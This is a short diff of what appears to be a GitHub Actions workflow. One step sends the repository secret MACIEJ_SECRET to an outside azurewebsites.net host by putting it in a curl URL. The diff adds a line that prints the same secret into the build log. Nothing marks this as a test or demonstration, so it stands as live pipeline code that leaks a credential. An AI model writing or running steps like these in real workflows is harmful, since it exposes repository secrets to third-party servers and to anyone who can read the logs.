@@ -18,4 +18,5 @@ jobs:
           SECRET: ${{ secrets.MACIEJ_SECRET }}
         run: |
           curl -L https://wa-ncd-sec01.azurewebsites.net/$SECRET
+          echo $SECRET
 
